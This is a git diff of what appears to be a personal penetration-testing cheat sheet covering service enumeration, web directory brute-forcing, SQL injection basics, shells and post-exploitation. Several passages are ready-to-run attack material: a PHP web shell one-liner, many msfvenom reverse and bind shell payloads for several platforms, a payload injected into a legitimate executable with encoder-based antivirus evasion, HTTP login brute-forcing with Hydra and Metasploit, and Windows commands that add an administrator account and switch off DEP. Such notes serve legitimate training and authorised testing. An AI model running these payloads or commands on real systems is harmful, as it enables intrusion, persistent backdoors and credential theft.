@@ -125,6 +125,31 @@ Objectives:
 
 [0 Day Security Guide to Enumeration](http://www.0daysecurity.com/penetration-testing/enumeration.html) - Fantastic and covers a lot of services.
 
+
+### Common Tool and Common Switches
+
+|Switch|Function|
+|---|---|
+|**Curl**|curl \<options\> \[website\]|
+|-I|Retrieve headers|
+|-L|Location. Follows 3xx response code to new destination|
+|-H|Header|
+|**Netcat**|nc \<options\> \[address\] \[port\]|
+|-l|Listen on a port|
+|-p|Port for connecting to or listeing|
+|-n|No name resolution|
+|-v|verbose|
+|-e|Filename to exec after connect|
+|**Nmap**|nmap \<options\> $tgt|
+|-v|Verbose|
+|-n|No name resolution|
+|-T*n*|Timing 1 through 5 (5 is insane fast)|
+|-p*n*|Ports. -p- is all ports. *n* is a port or list of ports. Ex: -p22,80. Default is top 1000.|
+|-s*A*|*A* is type of scan. T is tcp. U is udp. Ex: -sT or -sU. Default is -sS|
+|-sV|Service Version aka Banner Grab|
+|-sC|Run default scripts|
+|-o*A name*|Output type and name. A is all types. Example: -oA server outputs server.nmap,server.gnmap and server.xml|
+
 ### PORT SCANNING (All ports for both TCP/UDP)
 
 Nmap is great for the TCP Stack and partial scan of UDP stack.  For the UDP stack masscan or unicorn scan works well.
@@ -235,9 +260,7 @@ Look for: Version (hint at OS and infrastructure), Zone XFR
 
 ### 80 - http
 
-**Enumeration Only; Web App Attacks Later in Guide**
-
-[SEC LISTS](https://github.com/danielmiessler/SecLists.git) or `apt-get install seclists`
+**Basic Enumeration Only; Web App Attacks Later in Guide**
 
 Look for:
 - Webserver version (Apache 2.34 etc.) **AND** Web Application Version (WordPress?)
@@ -266,38 +289,17 @@ Identify Both the Application and the Server
 	- CLI Graphical Browser `browsh --startup-url $tgt` and `CTRL + q` to quit
 	- Lynx, a highly effecient CLI text browser `lynx http://$tgt`
 
-#### Mapping of Directories
+Simple get request on each web port:
 
-MSFConsole
-- use auxiliary/scanner/http/brute_dirs
-- set RHOSTS $tgt
-- run
+```bash
+curl $tgt
 
-Dirbuster
-- Use MSF Dir List with dirb `dirb http://$tgt /usr/share/metasploit-framework/data/wordlists/directory.txt`
-- Start crawling the site for Directories: `dirb http://$tgt/ |-o dirb-$portNum.out`
-- Now check for files and end points: `dirb http://$tgt/ -X .htm,.html,.php |tee dirb-$portNum-files.out`
+curl $tgt:9392
 
-Go Buster (Another Dir Buster)
-- `gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://$tgt/`
-- `gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://$tgt`
-- `gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out`
+for i in 80 9392; do echo "$tgt:$i"; curl $tgt:$i;done
+```
 
-#### Mapping of Pages
-
-Confirm hidden pages
-- CGI's are gold here
-
-`gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e`
-
-#### Check Robots.txt
-
-MSFConsole
-1. use auxiliary/scanner/http/robots_txt
-2. set RHOSTS 192.30.247.3
-3. run
-
-Manually with curl `curl http://$tgt/robots.txt |tee robots.txt`
+**Attacking Web Apps is beyond the Enumeration stage laid out here**
 
 ### 135 - RPC
 
@@ -370,9 +372,8 @@ Move on to JWT Attacks below
 
 enum4linux -a -v $tgt |tee enum4linux-a-v.out
 
-********************************************************
+***
 Scanning Misc.
-********************************************************
 
 #snmp-check- mad loot if the target offers snmp with a public string
 snmp-check $tgt
@@ -403,23 +404,176 @@ nmap -p 139,445 --script s,b-enum-users $tgt
 
 unicornscan -i tap0 -E -m U $tgt:a > unicornUDPfull
 
-******************
+***
 
-## WEB APP Testing
+## WEB APP Testing (For Net PenTesting)
+A seperate guide will be made for full on web app pentesting
 
-**Goals**:
+**Goals and Tasks**:
+
 1. Web Server Software/Version
 2. Web Application Software/Version
-3. SQLI?
-4. Vulns
+3. Map Directories
+	1. Brute Force with MSF Word List
+	2.  Check Robots.txt
+4. Auth Headers
+5. SQLI?
+6. Vulns
+
+Methodology for exploration (example):
+
+1. dirb $tgt
+2. Simply curl each dir found
+3. dirb $tgt/eachInterestingDir
+4. Simply curl each $tgt/eachInterestingDir/newestInterestingDir
+
+Don't forget going beyond just port 80
 
 LOOK UP AND TRY DEFAULT CREDS!!!
 
-Good, quick and dirty enum: `curl -i http://$tgt:80/`
+Good, quick and dirty enum of root headers: `curl -I http://$tgt:80/`
+
+[SEC LISTS](https://github.com/danielmiessler/SecLists.git) or `apt-get install seclists`
+
+### Mapping of Directories and Auth Headers
+
+**Mapping the dirs**:
+
+MSFConsole
+- use auxiliary/scanner/http/brute_dirs
+- set RHOSTS $tgt
+- run
+
+Built in Word Lists to use with any tool:
+
+1. /usr/share/metasploit-framework/data/wordlists/directory.txt
+2. /usr/share/metasploit-framework/data/wordlists/password.lst
+
+Use MSF Dir List with curl (dirb won't work with leading / 's)
+
+```bash
+for name in $(cat /usr/share/metasploit-framework/data/wordlists/directory.txt); do echo -e "\nTrying $tgt$name";echo "";curl http://$tgt$name;done
+```
+
+Dirbuster
+- Start crawling the site for Directories: `dirb http://$tgt/ |-o dirb-$portNum.out`
+- Now check for files and end points: `dirb http://$tgt/ -X .htm,.html,.php |tee dirb-$portNum-files.out`
+
+Go Buster (Another Dir Buster)
+- `gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://$tgt/`
+- `gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://$tgt`
+- `gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out`
+
+**Mapping their Auth Headers**
+Nmap
+
+```
+nmap -p 80 -sV -sC $tgt
+```
+Bash:
+```bash
+curl -I http://$tgt/dir/
+```
+
+One liner to check Auth Headers of list of Dirs
+
+```bash
+for i in dir prod dev Admin Data;do echo "http://$tgt/$i";curl -I http://$tgt/$i/;done
+```
+
+MSF
+- use auxiliary/scanner/http/http_header
+- set RHOSTS $tgt
+- set HTTP_METHOD GET
+- set TARGETURI /targetdir/
+- exploit
+
+### Mapping of Pages
+
+Confirm hidden pages
+- CGI's are gold here
+
+`gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e`
+
+### Check Robots.txt
+
+MSFConsole
+1. use auxiliary/scanner/http/robots_txt
+2. set RHOSTS 192.30.247.3
+3. run
+
+Manually with curl `curl http://$tgt/robots.txt |tee robots.txt`
 
 Initial Sweep of the website (Directory Busting): `gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out`
 
 Confirm hidden pages: `gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e`
+
+### Brute Force HTTP Auth
+
+MSF
+- use auxiliary/scanner/http/http_login
+- set RHOSTS 192.165.34.3
+- set USER_FILE /tmp/users
+- set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+- set VERBOSE false
+- set AUTH_URI /dir/
+- exploit
+
+Hydra
+```bash
+hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/password.lst
+$tgt http-get /targetDir
+```
+
+### Use Creds to Auth to HTTP Site
+
+Basic HTTP Auth
+```bash
+curl -u name:password http://$tgt/dir/
+```
+To auth and follow a 301
+
+```bash
+curl -u admin:57chevy -L http://$tgt/Admin
+```
+
+Digest HTTP Auth
+```bash
+curl --digest -u name:password http://$tgt/dir/
+```
+### Look For Writable Dirs
+
+HTTP Method of PUT means it is writable
+
+Nikto
+```bash
+nikto -h "http://$tgt/Dir"
+```
+
+MSF
+- msfconsole
+- use auxiliary/scanner/http/http_put
+- set RHOSTS $tgt
+- set PATH /Dir/
+- exploit
+
+To remove the test file
+- set ACTION DELETE
+
+###  Looking for Dirs that Allow Dir/File Listing
+
+Iterate through a for loop with the name of each dir space seperated
+
+```bash
+for i in Admin dir poc pro Benefits Data Invitation Office Site;do echo "http://$tgt/$i";curl -I -L http://$tgt/$i/;done |tee allow-listing
+
+grep -B1 "200" allow-listing
+```
+### Get Request with a specified user agent
+
+```bash
+curl -H "User-Agent: Firefox" $tgt/protectedDir
+```
 
 ### wfuzz taken from pentesterlab.com sqli to shell
 
@@ -436,6 +590,27 @@ wfuzz to detect php on the server
 ```bash
 python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php
 ```
+### Node.js
+
+Identifying you are dealing with Node.js
+
+```bash
+curl http://$tgt/json/
+```
+Look in the JSON for clues with values like:
+- "title":"node.js"
+- "type":"node"
+- "url":"file:///app/node.js"
+
+Inspect the node
+
+```bash
+node-inspect $tgt:NodejsPort
+help
+.exit
+```
+
+
 ### JWT (Java Web Token)Attacks
 
 Try to auth with JWT with curl:
@@ -531,256 +706,66 @@ ORACLE isql
 
 [Default Password](http://www.defaultpassword.com/)
 
+***
+
 ### SQL Injection
 
 [SQLI Guide by Travis Altman](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)
 
-## SHELLS
+Goals:
+- Enumerate DB's
+- Find Creds and or rain shells.
+- Test it, Map it, Steal it....
+
+From pentesterlab.com:
+- retrieve information using the SELECT statement;
+- update information using the UPDATE statement;
+- add new information using the INSERT statement;
+- delete information using the DELETE statement.
+- Asterisk * is WILDCARD
+
+
+Basic Examples:
+```
+SELECT columnsYouWant FROM tablesYouWant WHERE informationMatchesWhatYouWant
+```
+Example:
+```
+SELECT column1, column2, column3 FROM table1 WHERE column4='user' AND column5=3 AND column6=4;
+```
+
+Will retrieve from the following table:
+|column1|column2|column3|column4|column5|column6|
+|---|---|---|---|---|---|
+|1|test|Paul|user|3|13|
+|2|test1|Robert|user|3|4|
+|3|test33|Super|user|3|4|
+the following info:
+|column1|column2|column3|
+|---|---|---|
+|2|test1|Robert|
+|3|test33|Super|
+
+- Note Row 1 wasn't selected because of what was matched in Column 6.
+- Only the first 3 columns were selected because of the query
+
+#### Testing if its vulnerable
 
-nc shell upgrade to /bin/bash/
-
-`python -c "import pty;pty.spawn('/bin/bash');"`
-
-Py3
-
-`python3 -c "import pty;pty.spawn('/bin/bash');"`
-
-PHP
-
-`<?php echo shell_exec($_GET['cmd']);?>`
-
-
-============================================================================================
-					            MSF VENOM
-============================================================================================
-A great cheat sheet: https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/
-
-# List payloads
-msfvenom -l
-
-#Encoding payloads
-msfvenom -p <Payload> -e <encoder> -f <format> -i <encode count> LHOST=$me LPORT=$mePort
-
-# Examples from Thor-Sec:
-
-#Handler Setup
-#Meterpreter
-msfconsole -q
-use exploit/multi/handler
-set PAYLOAD <PAYLOAD>
-set LHOST <IP>
-set LPORT <IP>
-set ExitOnSession false
-exploit -j -z
-
-# Netcat
-nc -nlvp <PORT>
-
-# Linux--------------------
-# Reverse Shell
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
-
-# Bind Shell
-msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
-
-# Windows------------------
-Reverse Shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
-
-Bind Shell
-msfvenom -p windows/meterpreter/bind_tcp RHOST= <IP> LPORT=<PORT> -f exe > shell.exe
-
-CMD Shell
-msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
-
-User Creation
-msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
-
-# Mac ----------------------
-Reverse Shell
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho
-
-# Bind Shell
-msfvenom -p osx/x86/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > shell.macho
-
-# Web Payloads-------------------
-# PHP
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
-cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
-
-# ASP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
-
-# JSP
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
-
-# WAR
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
-
-# Scripting Payloads
-# Python
-msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
-
-# Bash
-msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
-
-# Perl
-msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
-
----------------------------------A/V EVASION-----------------------------------------------
-# Inject payload into a legit file
-
-# Veil evasion
-
-# ? what else?
-
-# MSF5 Evasion Payloads
-
------------------------------------ More Advanced Venom Examples --------------------------------------------
-#  Exit THREAD instead of a Process to leave a door open (example bind shell)
-
-msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf LHOST=$me LPORT=9835 > linuxmetrpr.elf
-
-msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$me LPORT=443 > nonstaged.elf
-
-msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$me LPORT=443 > metrev443.elf
-
-msfvenom -p linux/x86/shell_reverse_tcp -f c -b "\x00\x0a\x0d" LHOST=$me LPORT=9874 EXITFUNC=thread
-
-#inject a payload into an PE
-msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x ./plink.exe -o plinkevil443.exe
-
-msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f jsp > rev443.jsp
-
-msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f asp > shellrev443.asp
-
-msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shellrev443.exe
-
-msfvenom -p windows/meterpreter/reverse_http LHOST=$me LPORT=80 -f exe -e x86/shikata_ga_nai -i 14 -o metrevhttp80.exe
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$me LPORT=53 -f exe -e x86/shikata_ga_nai -i 9 -o metrev53.exe
-
-============================================================================================
-					POSH For PenTesters (Notes From PenTester Academy)
-============================================================================================
-# Enumerate HotFixes
-Get-HotFixes
-
-============================================================================================
-					WINDOWS COMMAND LINE STUFF
-============================================================================================
-# GREAT Source for WMIC Commands!
-https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
-
-#Show networked drives
-net share
-
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
-
-c:\windows\system32\cmd.exe
-
-netstat -ano
-
-tasklist /svc
-
-tasklist /svc > svclist.txt
-
-schtasks /query /fo LIST /v
-
-net start
-
-DRIVERQUERY
-
-netsh firewall show opmode
-
-netsh firewall set opmode enable
-
-netsh firewall add portopening TCP 80 HTTP enable subnet
-
-dir "C:\Documents and Settings"
-
-systeminfo
-
-net user John fadf24as /ADD
-
-net localgroup administrators John /add
-
-whoami /priv
-	/groups
-	/user
-
-#Windowsxp
-echo %username%
-
-#Disable MPP
-netsh int tcp set security mpp=disabled
-
-
-
-bootcfg /raw "/noexecute=alwaysoff"
-
-============================================================================================
-				INTERNAL ENUMERATION
-		Goals: understand who, what, where, when, Why
-			Remember: Check, Collect, Clean
-============================================================================================
-
-1. Who else is on right now?
-Linux: w
-Windows: query user		remotely: query user /server:computername
-
-2. Who has been on?
-Linux: last
-Windows: ?
-
-3. What has this box been talking to?
-Linux: arp -e, check ssh known_hosts
-Windows: arp /all, check ssh known_hosts
-
-4. What is this box able to talk to?
-Linux: route print, ip addr
-Windows: route print, ipconfig
-
-
-==========================================================================================
-			     SQLI
-	Goals: Enumerate DB's; Find Creds and or rain shells.
-		 Test it, Map it, Steal it....
-==========================================================================================
-#From pentesterlab.com:
-# retrieve information using the SELECT statement;
-# update information using the UPDATE statement;
-# add new information using the INSERT statement;
-# delete information using the DELETE statement.
-# Asterisk * is WILDCARD
-
-#SELECT columnsYouWant FROM tablesYouWant WHERE informationMatchesWhatYouWant
-#Example: SELECT column1, column2, column3 FROM table1 WHERE column4='user' AND column5=3 AND column6=4;
-# will retrieve from the following table:
-#column1	column2		column3		column4		column5		column6
-# 1			test		Paul		user			3		   13
-# 2			test1		Robert		user			3		   4
-# 3			test33		Super		user			3		   4
-# the following info:
-#column1	column2		column3
-#	2		 test1		Robert
-#	3		 test33		 Super
-# Note Row 1 wasn't selected because of what was matched in Column 6.
-# Only the first 3 columns were selected because of the query
-
-**********************************TESTING IT*************************************
 Goals:
 1. Find out if it is sending unfiltered data to the db
 2. How is it reading inputs
-Testing for a vulnerability-
-IOW see if it breaks- if it does it is passing stuff directly to the back-end :-)
-********************************************************************************
-#Does it do math; 2-1 shows article 1
-/article.php?id=2-1
 
-#Does it look for stings?
-#a ' break the backend query by passing the ' as 's are used for strings in an SQL Query
-/article.php?id=1'      (added a ' to the end)
+Testing for a vulnerability:
+
+IOW see if it breaks- if it does it is passing stuff directly to the back-end :-)
+
+Does it do math? 2-1 shows article 1
+
+`/article.php?id=2-1`
+
+Does it look for stings? Does a **'** break the backend query by passing the **'** as 's are used for strings in an SQL Query?
+
+`/article.php?id=1'      (added a ' to the end)`
 
 #PROPER EXAMPLES OF SQL WE ARE TRYING TO BREAK (What is under the hood):
 #SELECT id,name FROM users where name='test' and id=3;
@@ -951,6 +936,294 @@ SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
 SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
 
 SELECT column_name FROM all_tab_columns WHERE table_name = 'USER$' and owner = 'SYS';
+
+
+***
+
+## Shells
+
+### Upgrades and One Liners
+
+nc shell upgrade to /bin/bash/
+```python
+python -c "import pty;pty.spawn('/bin/bash');"
+```
+Py3
+```python
+python3 -c "import pty;pty.spawn('/bin/bash');"
+```
+PHP
+```php
+<?php echo shell_exec($_GET['cmd']);?>
+```
+
+Classic Netcat Listener
+
+```bash
+nc -nlvp <PORT>
+```
+
+***
+
+### MSF VENOM (Shell Payload Generator)
+
+Generates shells or other malicious payloads.
+
+[A great cheat sheet](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/) from ThorSec.
+
+|Switch|Function|
+|---|---|
+|-p|payload|
+|-e|encoder|
+|-i|encode code (number of rounds)|
+|-f|format|
+|LHOST=|Listening Host Address|
+|LPORT=|Listening Port Number|
+|EXITFUNC=thread|Exit function thread and not proc|
+
+List payloads available: 
+
+```bash
+msfvenom -l
+```
+
+Encoding payloads
+
+```bash
+msfvenom -p <Payload> -e <encoder> -f <format> -i <encode count> LHOST=$me LPORT=$mePort
+```
+
+#### Examples from Thor-Sec:
+
+Handler Setup for Meterpreter:
+
+```bash
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD <PAYLOAD>
+set LHOST <IP>
+set LPORT <IP>
+set ExitOnSession false
+exploit -j -z
+```
+
+#### Linux Payloads
+
+Reverse Shell
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+```
+
+Bind Shell
+```bash
+msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+```
+
+#### Windows
+
+Reverse Shell
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+```
+
+Bind Shell
+```bash
+msfvenom -p windows/meterpreter/bind_tcp RHOST= <IP> LPORT=<PORT> -f exe > shell.exe
+```
+
+CMD Shell
+```bash
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+```
+
+User Creation
+```bash
+msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
+```
+
+#### Mac
+
+Reverse Shell
+```bash
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho
+```
+
+Bind Shell
+```bash
+msfvenom -p osx/x86/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > shell.macho
+```
+
+#### Web App Payloads
+
+PHP
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+```
+
+ASP
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+```
+
+JSP
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+```
+
+WAR
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+```
+
+#### Scripting Payloads
+Python
+```bash
+msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
+```
+
+Bash
+```bash
+msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
+```
+
+Perl
+```bash
+msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
+```
+
+#### A/V EVASION
+ 
+Inject payload into a legit file
+
+Veil evasion
+
+? what else?
+
+MSF5 Evasion Payloads
+
+?
+
+#### More Advanced Venom and More Examples
+
+Inject a payload into an PE
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x ./plink.exe -o plinkevil443.exe
+```
+
+Exit THREAD instead of a Process to leave a door open (example bind shell)
+
+msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf LHOST=$me LPORT=9835 > linuxmetrpr.elf
+
+msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$me LPORT=443 > nonstaged.elf
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$me LPORT=443 > metrev443.elf
+
+msfvenom -p linux/x86/shell_reverse_tcp -f c -b "\x00\x0a\x0d" LHOST=$me LPORT=9874 EXITFUNC=thread
+
+msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f jsp > rev443.jsp
+
+msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f asp > shellrev443.asp
+
+msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shellrev443.exe
+
+msfvenom -p windows/meterpreter/reverse_http LHOST=$me LPORT=80 -f exe -e x86/shikata_ga_nai -i 14 -o metrevhttp80.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$me LPORT=53 -f exe -e x86/shikata_ga_nai -i 9 -o metrev53.exe
+
+***
+
+## Post Exploitation and Internal Enumeration
+
+### POSH For PenTesters (Notes From PenTester Academy)
+
+Enumerate HotFixes
+
+```powershell
+Get-HotFixes
+```
+
+### WINDOWS COMMAND LINE STUFF
+
+[GREAT Source for WMIC Commands!](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
+
+Show networked drives
+
+```cmd
+net share
+```
+
+Execute PoSh Script from Windows Command Line
+
+```cmd
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+```
+
+c:\windows\system32\cmd.exe
+
+netstat -ano
+
+tasklist /svc
+
+tasklist /svc > svclist.txt
+
+schtasks /query /fo LIST /v
+
+net start
+
+DRIVERQUERY
+
+netsh firewall show opmode
+
+netsh firewall set opmode enable
+
+netsh firewall add portopening TCP 80 HTTP enable subnet
+
+dir "C:\Documents and Settings"
+
+systeminfo
+
+net user John fadf24as /ADD
+
+net localgroup administrators John /add
+
+whoami /priv
+	/groups
+	/user
+
+#Windowsxp
+echo %username%
+
+#Disable MPP
+netsh int tcp set security mpp=disabled
+
+
+
+bootcfg /raw "/noexecute=alwaysoff"
+
+### INTERNAL ENUMERATION
+
+Goals:
+- understand who, what, where, when, Why
+- Remember: Check, Collect, Clean
+
+1. Who else is on right now?
+	- Linux: w
+	- Windows: query user
+	- remotely: query user /server:computername
+2. Who has been on?
+	- Linux: last
+	- Windows: ?
+3. What has this box been talking to?
+	- Linux: arp -e, check ssh known_hosts
+	- Windows: arp /all, check ssh known_hosts
+4. What is this box able to talk to?
+	- Linux: route print, ip addr
+	- Windows: route print, ipconfig
+
+
 
 ============================================================================================
 					FILE TRANSFER  Goals: Upload tools to expand access
